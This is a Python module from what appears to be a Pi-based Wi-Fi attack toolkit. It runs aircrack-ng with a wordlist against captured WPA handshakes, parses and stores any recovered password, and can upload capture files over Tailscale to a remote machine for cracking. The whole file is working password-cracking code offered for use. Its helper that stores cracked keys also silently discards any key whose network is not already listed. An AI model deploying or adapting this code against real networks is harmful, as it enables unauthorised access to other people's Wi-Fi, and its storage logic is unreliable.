# -*- coding: utf-8 -*-
"""Manual cracking — never called by the orchestrator.

on-box: aircrack-ng against the local wordlist.
server: hand the capture file to the strong box over Tailscale (network.upload).
"""
import os
import re

import config
from attack import tools
from cracked_store import load_cracked, save_cracked

KEY_RE = re.compile(r"KEY FOUND!\s*\[\s*(.*?)\s*\]")


def _store_psk(bssid, psk):
    entries = load_cracked()
    want = config._norm_bssid(bssid)
    for e in entries:
        if config._norm_bssid(e.get("bssid")) == want:
            e["psk"] = psk
            save_cracked(entries)
            return
    save_cracked(entries)


def crack_onbox(entry, progress_cb=None):
    """Run aircrack-ng against entry['cap'] using the local wordlist.

    Returns {"ok","psk","error"}.
    """
    cap = entry.get("cap")
    if not cap or not os.path.exists(cap):
        return {"ok": False, "error": "no capture file"}
    if not os.path.exists(config.WORDLIST_PATH):
        return {"ok": False, "error": "no wordlist"}
    if not tools.tool_ok(tools.AIRCRACK):
        return {"ok": False, "error": "aircrack missing"}
    if progress_cb:
        progress_cb("cracking %s..." % (entry.get("essid") or "?"))
    cmd = [tools.AIRCRACK, "-a", "2", "-w", config.WORDLIST_PATH]
    if entry.get("bssid"):
        cmd += ["-b", entry["bssid"]]
    cmd.append(cap)
    # rockyou can take a while on a Pi; bound it generously.
    res = tools.run(cmd, timeout=1800)
    if not res:
        return {"ok": False, "error": "aircrack failed"}
    m = KEY_RE.search((res.stdout or "") + (res.stderr or ""))
    if m:
        psk = m.group(1)
        _store_psk(entry.get("bssid"), psk)
        return {"ok": True, "psk": psk}
    return {"ok": False, "error": "not in wordlist"}


def crack_server(entry, progress_cb=None):
    """Ship the capture file to the server to crack there. Returns {"ok","error"}."""
    from network import upload as net_upload
    cap = entry.get("cap")
    if not cap or not os.path.exists(cap):
        return {"ok": False, "error": "no capture file"}
    return net_upload.upload_file(cap, progress_cb=progress_cb)
